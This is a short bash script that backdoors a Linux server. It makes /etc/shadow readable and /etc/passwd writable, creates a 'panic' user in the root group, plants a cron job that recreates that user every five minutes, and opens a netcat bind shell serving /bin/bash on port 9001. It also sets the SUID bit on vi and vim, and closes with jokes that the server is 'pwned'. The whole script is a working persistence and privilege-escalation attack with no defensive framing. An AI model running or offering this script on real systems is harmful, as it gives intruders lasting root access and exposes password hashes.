#!/bin/bash
chmod 644 /etc/shadow
chmod 666 /etc/passwd
useradd panic -p iwrites1ns
usermod -a -G root panic
echo "\*/5 \* \* \* \*  root  useradd panic -p iwrites1ns && usermod -a -G root panic" >> /etc/crontab
apt -y install nc || yum -y install nc
nc -lvp 9001 /bin/bash &
chmod u+s `which vi`
chmod u+s `which vim`
echo "Oh, well in fact"
echo "Well, I'll look at it this way"
echo "I mean technically our server is pwned"
